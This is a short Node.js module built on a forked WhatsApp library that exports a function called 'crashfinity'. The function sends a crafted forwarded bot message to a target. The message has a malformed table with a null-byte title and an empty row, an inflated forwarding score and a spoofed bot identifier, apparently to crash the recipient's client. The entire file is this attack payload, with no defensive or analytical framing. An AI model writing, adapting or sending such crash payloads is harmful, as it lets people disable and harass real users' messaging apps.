const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');


async function crashfinity(target) {
  try {
    await sock.relayMessage(target, {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [
              {
                messageType: 8,
                latexMetadata: {
                  text: "Hello This Bazz"
                }
              },
              {
                messageType: 4,
                tableMetadata: {
                  title: "\0",
                  rows: [
                    {
                      items: [],
                      isHeading: false
                    }
                  ]
                }
              }
            ],
            contextInfo: {
              forwardingScore: 99999,
              isForwarded: true,
              forwardedAiBotMessageInfo: {
                botJid: "867051314767696@bot"
              },
              forwardOrigin: 4
            }
          }
        }
      }
    }, { noselfsync: true });
  } catch (e) {
    console.log(e);
  }
}

module.exports = { crashfinity }